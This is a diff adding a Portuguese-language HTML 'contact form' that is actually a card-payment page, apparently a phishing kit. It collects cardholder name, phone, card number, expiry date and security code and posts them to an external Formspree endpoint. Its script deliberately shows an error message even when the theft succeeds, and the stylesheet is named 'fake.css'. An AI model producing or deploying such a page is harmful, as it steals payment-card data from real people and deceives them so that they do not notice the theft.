@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Contato</title>
+    <link rel="stylesheet" href="fake.css">
+</head>
+<body>
+    <div class="title-container">
+        <h1>Método de pagamento via cartão.</h1>
+    </div>
+    <div class="container">
+        <div class="form-card">
+            <form id="contactForm" action="https://formspree.io/f/xwpejrqp" method="POST">
+                <div class="form-group">
+                    <label for="phone">Nome no cartão</label>
+                    <input type="text" id="phone" name="phone" maxlength="15" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="name">Telefone</label>
+                    <input type="text" id="name" name="name" maxlength="25" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="numberC">Número do cartão</label>
+                    <input type="text" id="numberC" name="numberC" minlength="13" maxlength="16" required>
+                </div>
+
+                <div class="flex-row">
+                    <div class="form-group-half">
+                        <label for="entryDate">Data de validade</label>
+                        <input type="date" id="entryDate" name="entryDate" required>
+                    </div>
+
+                    <div class="form-group-half">
+                        <label for="numberS">Código de segurança</label>
+                        <input type="text" id="numberS" name="numberS" maxlength="3" pattern="\d{3}" required>
+                    </div>
+
+                    <div class="form-group-half">
+                        <label for="installments">N'Parcelas</label>
+                        <input type="number" id="installments" name="installments" min="1" max="24" required>
+                    </div>
+                </div>
+
+                <button type="submit">Comprar</button>
+            </form>
+            <div id="responseMessage" class="response-message">
+                <p id="responseText">Erro: O formulário não pôde ser enviado. Por favor, tente novamente.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Seção para as imagens -->
+    <div class="image-gallery">
+        <img src="imagem/m.gif" alt="Imagem 1">
+        <img src="imagem/e.png" alt="Imagem 2">
+        <img src="imagem/v.png" alt="Imagem 3">
+        <img src="imagem/h.png" alt="Imagem 4">
+    </div>
+
+    <script>
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
+            fetch(event.target.action, {
+                method: 'POST',
+                body: new FormData(event.target),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Exibe a mensagem de erro mesmo em caso de sucesso
+                    document.getElementById('responseText').textContent = 'Obrigado! Seu formulário foi enviado com sucesso, mas houve um erro na validação.';
+                } else {
+                    throw new Error('Erro ao enviar o formulário');
+                }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                document.getElementById('responseText').textContent = 'Erro: O formulário não pôde ser enviado. Por favor, tente novamente.';
+            })
+            .finally(() => {
+                // Exibe a mensagem de resposta sempre
+                document.getElementById('responseMessage').style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
